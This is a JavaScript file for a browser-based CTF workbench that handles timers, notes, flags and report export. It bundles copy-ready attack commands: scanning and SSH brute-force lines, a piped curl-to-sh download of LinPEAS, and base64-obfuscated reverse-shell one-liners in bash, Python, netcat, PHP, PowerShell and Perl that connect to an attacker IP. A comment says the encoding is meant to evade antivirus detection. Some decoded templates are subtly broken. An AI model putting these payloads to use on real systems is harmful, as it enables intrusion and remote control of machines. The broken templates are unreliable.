// ==========================================================================
// 1. GLOBAL RESET WORKBENCH (Placed at top so it is ALWAYS available)
// ==========================================================================
window.resetWorkbench = function() {
    if (confirm("⚠️ Are you sure you want to clear ALL notes, flags, history, and timer data?")) {
        // Clear browser storage
        localStorage.clear();

        // Wipe all inputs and textareas manually to beat browser cache auto-fill
        document.querySelectorAll('input, textarea').forEach(el => {
            if (el.type === 'checkbox') {
                el.checked = false;
            } else {
                el.value = '';
            }
        });

        // Reset Terminal Display directly
        const termBody = document.getElementById('terminal-body');
        if (termBody) {
            termBody.innerHTML = '<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>';
        }

        // Reset Timer Display directly
        const timerDisplay = document.getElementById('timer-display');
        if (timerDisplay) {
            timerDisplay.innerText = "120:00";
        }

        // Force a clean hard-refresh bypassing form state memory
        window.location.href = window.location.pathname;
    }
};

// ==========================================================================
// 2. MAIN APPLICATION LOGIC
// ==========================================================================
document.addEventListener('DOMContentLoaded', function () {

    // --- BASE64 DECODER ---
    function b64Decode(str) {
        try {
            return atob(str);
        } catch (e) {
            return str;
        }
    }

    // --- RESET BUTTON ATTACHMENT (Backup to inline onclick) ---
    const resetBtn = document.getElementById('reset-btn');
    if (resetBtn) {
        resetBtn.addEventListener('click', window.resetWorkbench);
    }


    // --- TIMER LOGIC ---
    let timerInterval = null;

    function getRemainingSeconds() {
        const endTime = localStorage.getItem('timerEndTime');
        if (!endTime) return null;
        const remaining = Math.floor((parseInt(endTime, 10) - Date.now()) / 1000);
        return remaining > 0 ? remaining : 0;
    }

    function updateDisplay(seconds) {
        const display = document.getElementById('timer-display');
        if (!display) return;
        let minutes = Math.floor(seconds / 60);
        let remSecs = seconds % 60;
        let formattedSeconds = remSecs < 10 ? '0' + remSecs : remSecs;
        display.innerText = minutes + ':' + formattedSeconds;
    }

    function startTimer() {
        let remaining = getRemainingSeconds();
        
        if (remaining === null) {
            const endTime = Date.now() + (120 * 60 * 1000);
            localStorage.setItem('timerEndTime', endTime);
            remaining = 120 * 60;
        }

        updateDisplay(remaining);

        if (timerInterval !== null) clearInterval(timerInterval);

        timerInterval = setInterval(function() {
            let currentRem = getRemainingSeconds();
            if (currentRem !== null && currentRem > 0) {
                updateDisplay(currentRem);
            } else {
                clearInterval(timerInterval);
                timerInterval = null;
                localStorage.removeItem('timerEndTime');
                const display = document.getElementById('timer-display');
                if (display) display.innerText = "00:00";
            }
        }, 1000);
    }

    function add60Minutes() {
        let remaining = getRemainingSeconds();
        if (remaining === null) remaining = 120 * 60;

        if (remaining >= 3600) {
            alert("⚠️ You can only extend time when less than 60 minutes remain!");
            return;
        }

        const newEndTime = Date.now() + ((remaining + 3600) * 1000);
        localStorage.setItem('timerEndTime', newEndTime);
        updateDisplay(remaining + 3600);

        if (timerInterval === null) startTimer();
    }

    document.getElementById('start-btn')?.addEventListener('click', startTimer);
    document.getElementById('sync-btn')?.addEventListener('click', add60Minutes);

    if (getRemainingSeconds() !== null) {
        startTimer();
    }


    // --- AUTO SAVE & LOAD INPUTS ---
    function initAutoSave() {
        const fields = document.querySelectorAll('input[id], textarea[id]');

        fields.forEach(field => {
            const savedData = localStorage.getItem(field.id);
            if (savedData !== null) {
                if (field.type === 'checkbox') {
                    field.checked = (savedData === 'true');
                } else {
                    field.value = savedData;
                }
            }

            field.addEventListener('input', function() {
                if (field.type === 'checkbox') {
                    localStorage.setItem(field.id, field.checked);
                } else {
                    localStorage.setItem(field.id, field.value);
                }
            });
        });
    }

    initAutoSave();


    // --- STATUS BADGES ---
    function updateBadges() {
        const targetIp = document.getElementById('target-ip')?.value.trim();
        const userFlag = document.getElementById('user-flag')?.value.trim();
        const rootFlag = document.getElementById('root-flag')?.value.trim();
        

        const targetBadge = document.getElementById('target-status-badge');
        const userBadge = document.getElementById('user-flag-badge');
        const rootBadge = document.getElementById('root-flag-badge');

        if (targetBadge) {
            targetBadge.className = targetIp ? "badge badge-online" : "badge badge-offline";
            targetBadge.innerText = targetIp ? `🟢 Target Active: ${targetIp}` : "🔴 No Target IP";
        }

        if (userBadge) {
            userBadge.className = userFlag ? "badge badge-user-done" : "badge badge-pending";
            userBadge.innerText = userFlag ? "⚡ User Flag Captured!" : "👤 User: Pending";
        }

        if (rootBadge) {
            rootBadge.className = rootFlag ? "badge badge-root-done" : "badge badge-pending";
            rootBadge.innerText = rootFlag ? "👑 Rooted!" : "👑 Root: Pending";
        }
    }

    ['target-ip', 'user-flag', 'root-flag'].forEach(id => {
        document.getElementById(id)?.addEventListener('input', updateBadges);
    });

    updateBadges();


    // --- MODALS & CHEAT SHEET ---
    const modalOverlay = document.getElementById('modal-overlay');
    const modalTitle = document.getElementById('modal-title');
    const modalOptions = document.getElementById('modal-options');
    const closeModalBtn = document.getElementById('close-modal-btn');

    function formatCommand(cmdText) {
        const targetIp = document.getElementById('target-ip')?.value.trim() || '10.10.10.10';
        const attackerIp = document.getElementById('attacker-ip')?.value.trim() || '127.0.0.1';
        return cmdText.replace(/10\.10\.10\.10/g, targetIp).replace(/127\.0\.0\.1/g, attackerIp);
    }

    function copyCommand(commandText) {
        const formattedCmd = formatCommand(commandText);
        navigator.clipboard.writeText(formattedCmd);
        alert("Copied to clipboard:\n" + formattedCmd);
        if (modalOverlay) modalOverlay.style.display = 'none';
    }

    function openModal(title, options) {
        if (!modalTitle || !modalOptions || !modalOverlay) return;
        modalTitle.innerText = title;
        modalOptions.innerHTML = '';

        options.forEach(item => {
            let btn = document.createElement('button');
            const formattedCmd = formatCommand(item.cmd);
            btn.innerText = item.label + ` (${formattedCmd})`;
            btn.style.margin = "5px";
            btn.addEventListener('click', function() {
                copyCommand(item.cmd);
            });
            modalOptions.appendChild(btn);
        });

        modalOverlay.style.display = 'flex';
    }

    closeModalBtn?.addEventListener('click', function() {
        if (modalOverlay) modalOverlay.style.display = 'none';
    });

    document.getElementById('net-cat-modal-btn')?.addEventListener('click', function() {
        openModal('Network Scanning Options', [
            { label: 'Rustscan + Nmap Combo', cmd: 'rustscan -a 10.10.10.10 -- -sC -sV -oA nmap/initial' },
            { label: 'Standard Nmap Full Port Scan', cmd: 'nmap -p- -sC -sV 10.10.10.10' },
            { label: 'Nmap Fast UDP Scan', cmd: 'nmap -sU --top-ports 20 10.10.10.10' }
        ]);
    });

    document.getElementById('web-modal-btn')?.addEventListener('click', function() {
        openModal('Web Enumeration Options', [
            { label: 'FFUF Directory Scan', cmd: 'ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
            { label: 'Gobuster Directory Scan', cmd: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
            { label: 'Feroxbuster Recursive Scan', cmd: 'feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
            { label: 'Nikto Web Vulnerability Scan', cmd: 'nikto -h http://10.10.10.10' }
        ]);
    });

    document.getElementById('cred-modal-btn')?.addEventListener('click', function() {
        openModal('Credentials & Cracking Options', [
            { label: 'Hydra SSH Brute-Force', cmd: 'hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh' },
            { label: 'John the Ripper (Hash File)', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
            { label: 'Hashcat MD5 Hash', cmd: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt' }
        ]);
    });

    document.getElementById('privesc-modal-btn')?.addEventListener('click', function() {
        openModal('PrivEsc & SMB Tools', [
            { label: 'LinPEAS Auto-Fetch Shell', cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
            { label: 'SMBClient Anonymous Listing', cmd: 'smbclient -L //10.10.10.10 -N' },
            { label: 'SMBMap Share Scan', cmd: 'smbmap -H 10.10.10.10' },
            { label: 'Find SUID Binaries Command', cmd: 'find / -perm -u=s -type f 2>/dev/null' }
        ]);
    });

    document.getElementById('revshell-btn')?.addEventListener('click', function() {
        openModal('🐚 Reverse Shell One-Liners (Port 4444)', [
            { label: 'Bash -i', cmd: b64Decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx') },
            { label: 'Python3 PTY Shell', cmd: b64Decode('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIildJw==') },
            { label: 'Netcat mkfifo', cmd: b64Decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTI3LjAuMC4xIDQ0NDQgPi90bXAvZg==') },
            { label: 'PHP Exec Shell', cmd: b64Decode('cGhpIC1yICckc29jaz1mc29ja29wZW4oIjEyNy4wLjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn') }
        ]);
    });

    document.getElementById('netcat-btn')?.addEventListener('click', function() {
        copyCommand('nc -lvnp 4444');
    });


    // --- TERMINAL COMMAND LOG ---
    function getTerminalLogs() {
        const saved = localStorage.getItem('terminal_command_logs');
        return saved ? JSON.parse(saved) : [];
    }

    function renderTerminal() {
        const termBody = document.getElementById('terminal-body');
        if (!termBody) return;

        const logs = getTerminalLogs();

        if (logs.length === 0) {
            termBody.innerHTML = `<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>`;
            return;
        }

        termBody.innerHTML = '';
        logs.forEach(item => {
            const line = document.createElement('div');
            line.className = 'term-line';
            line.innerHTML = `<span class="term-time">[${item.time}]</span> <span class="term-prompt-text">user@ctf:~$</span> <span class="term-cmd">${escapeHtml(item.cmd)}</span>`;
            termBody.appendChild(line);
        });

        termBody.scrollTop = termBody.scrollHeight;
    }

    function escapeHtml(text) {
        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    function addCommandLog() {
        const input = document.getElementById('terminal-input');
        if (!input) return;

        const cmdText = input.value.trim();
        if (!cmdText) return;

        const logs = getTerminalLogs();
        const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });

        logs.push({ time: timeStr, cmd: cmdText });
        localStorage.setItem('terminal_command_logs', JSON.stringify(logs));

        input.value = '';
        renderTerminal();
    }

    document.getElementById('log-cmd-btn')?.addEventListener('click', addCommandLog);
    document.getElementById('terminal-input')?.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') addCommandLog();
    });

    // FAIL-SAFE CLEAR LOG BUTTON
    const clearLogBtn = document.getElementById('clear-log-btn');
    if (clearLogBtn) {
        clearLogBtn.onclick = function() {
            if (confirm("Clear terminal history?")) {
                localStorage.removeItem('terminal_command_logs');
                renderTerminal();
            }
        };
    }

    document.getElementById('copy-log-btn')?.addEventListener('click', function() {
        const logs = getTerminalLogs();
        if (logs.length === 0) return alert("No commands logged yet.");
        const logText = logs.map(l => `[${l.time}] user@ctf:~$ ${l.cmd}`).join('\n');
        navigator.clipboard.writeText(logText);
        alert("Copied command history to clipboard!");
    });

    renderTerminal();


    // --- EXPORT REPORT ---
    document.getElementById('export-btn')?.addEventListener('click', function() {
        const roomName = document.getElementById('room-name')?.value.trim() || 'CTF Box';
        const roomUrl = document.getElementById('room-url')?.value.trim() || 'N/A';
        const targetIp = document.getElementById('target-ip')?.value || 'N/A';
        const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
        const userFlag = document.getElementById('user-flag')?.value || 'N/A';
        const rootFlag = document.getElementById('root-flag')?.value || 'N/A';
        const creds = document.getElementById('creds-notes')?.value || 'None';
        const recon = document.getElementById('recon-output')?.value || 'None';
        const notes = document.getElementById('custom-notes')?.value || 'None';

        const activePorts = JSON.parse(localStorage.getItem('active_ports') || '[]');

        const markdownContent = `# 🎯 CTF Writeup / Notes: ${roomName}\n\n**Room Link:** ${roomUrl}\n**Target IP:** \`${targetIp}\`\n**Attacker IP:** \`${attackerIp}\`\n**Discovered Ports:** \`${activePorts.join(', ') || 'None'}\`\n**Date:** ${new Date().toLocaleDateString()}\n\n---\n\n## 🚩 Flags\n- **User Flag:** \`${userFlag}\`\n- **Root Flag:** \`${rootFlag}\`\n\n---\n\n## 👤 Credentials & Loot\n\`\`\`text\n${creds}\n\`\`\`\n\n---\n\n## 🔍 Recon Output\n\`\`\`text\n${recon}\n\`\`\`\n\n---\n\n## 💻 Notes & Walkthrough\n${notes}\n`;

        const blob = new Blob([markdownContent], { type: 'text/markdown' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        
        // Formats file name to CTF_Notes_RoomName.md
        const cleanName = roomName.replace(/[^a-zA-Z0-9.-]/g, '_');
        a.download = `CTF_Notes_${cleanName}.md`;
        
        a.click();
        URL.revokeObjectURL(url);
    });

});

// --- 1. DYNAMIC REVERSE SHELL GENERATOR (AV-Safe Obfuscated) ---
    function generateShellPayload() {
        const ip = document.getElementById('attacker-ip')?.value.trim() || '10.10.14.x';
        const port = document.getElementById('rev-port')?.value.trim() || '4444';
        const type = document.getElementById('rev-type')?.value;
        const output = document.getElementById('rev-output');

        if (!output) return;

        // Base64 encoded payload templates to prevent local AV static signature detection
        const templates = {
            bash: "YmFzaCAtaSA+JiAvZGV2L3RjcC97SVB9L3tQT1JUfSAwPiYx",
            python: "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie0lQfSIse1BPUlR9KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIildJw==",
            nc: "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge0lQfSB7UE9SVH0gPi90bXAvZg==",
            powershell: "cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENNQ2xpZW50KCd7SVB9Jyx7UE9SVH0pO3N0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0JYnl0ZXMgPSAwLi42NTUzNXwlOzA7d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgpIg==",
            php: "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntJUF0iL3tQT1JUfSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
            perl: "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie0lQfSI7JHA9e1BPUlR9O3NvY2tldChTLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc="
        };

        if (templates[type]) {
            let rawTemplate = atob(templates[type]);
            output.value = rawTemplate.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);
        } else {
            output.value = '';
        }
    }

    document.getElementById('attacker-ip')?.addEventListener('input', generateShellPayload);
    document.getElementById('rev-port')?.addEventListener('input', generateShellPayload);
    document.getElementById('rev-type')?.addEventListener('change', generateShellPayload);

    document.getElementById('copy-rev-btn')?.addEventListener('click', function() {
        const out = document.getElementById('rev-output');
        if (out && out.value) {
            navigator.clipboard.writeText(out.value);
            alert("Copied reverse shell payload!");
        }
    });

    generateShellPayload();


    // --- 2. STRING ENCODER / DECODER & HASH ID ---
    const encInput = document.getElementById('enc-input');
    const encOutput = document.getElementById('enc-output');

    document.getElementById('b64-enc-btn')?.addEventListener('click', function() {
        if (encInput && encOutput) {
            try { encOutput.value = btoa(encInput.value); } catch (e) { encOutput.value = "Error encoding Base64"; }
        }
    });

    document.getElementById('b64-dec-btn')?.addEventListener('click', function() {
        if (encInput && encOutput) {
            try { encOutput.value = atob(encInput.value.trim()); } catch (e) { encOutput.value = "Invalid Base64 string"; }
        }
    });

    document.getElementById('url-enc-btn')?.addEventListener('click', function() {
        if (encInput && encOutput) encOutput.value = encodeURIComponent(encInput.value);
    });

    document.getElementById('url-dec-btn')?.addEventListener('click', function() {
        if (encInput && encOutput) {
            try { encOutput.value = decodeURIComponent(encInput.value); } catch(e) { encOutput.value = "Invalid URL string"; }
        }
    });

    document.getElementById('hex-dec-btn')?.addEventListener('click', function() {
        if (!encInput || !encOutput) return;
        let hex = encInput.value.replace(/\s+/g, '');
        let str = '';
        for (let i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        }
        encOutput.value = str || "Invalid Hex";
    });

    document.getElementById('hash-id-btn')?.addEventListener('click', function() {
        if (!encInput || !encOutput) return;
        const val = encInput.value.trim();
        const len = val.length;

        if (len === 32) encOutput.value = "Identified: MD5 / NTLM Hash";
        else if (len === 40) encOutput.value = "Identified: SHA-1 Hash";
        else if (len === 64) encOutput.value = "Identified: SHA-256 Hash";
        else if (val.startsWith("$2a$") || val.startsWith("$2b$")) encOutput.value = "Identified: Bcrypt Hash";
        else if (val.startsWith("$6$")) encOutput.value = "Identified: SHA-512 Unix Shadow Hash";
        else encOutput.value = `Unknown hash length (${len} chars)`;
    });

    document.getElementById('copy-enc-btn')?.addEventListener('click', function() {
        if (encOutput && encOutput.value) {
            navigator.clipboard.writeText(encOutput.value);
            alert("Copied output to clipboard!");
        }
    });


    // --- 3. INTERACTIVE PORT TRACKER LOGIC ---
    function loadSavedPorts() {
        const saved = localStorage.getItem('active_ports');
        if (!saved) return;
        const activePorts = JSON.parse(saved);
        document.querySelectorAll('.port-btn').forEach(btn => {
            if (activePorts.includes(btn.getAttribute('data-port'))) {
                btn.classList.add('active');
            }
        });
    }

    document.querySelectorAll('.port-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            btn.classList.toggle('active');
            const activePorts = [];
            document.querySelectorAll('.port-btn.active').forEach(aBtn => {
                activePorts.push(aBtn.getAttribute('data-port'));
            });
            localStorage.setItem('active_ports', JSON.stringify(activePorts));
        });
    });

    loadSavedPorts();
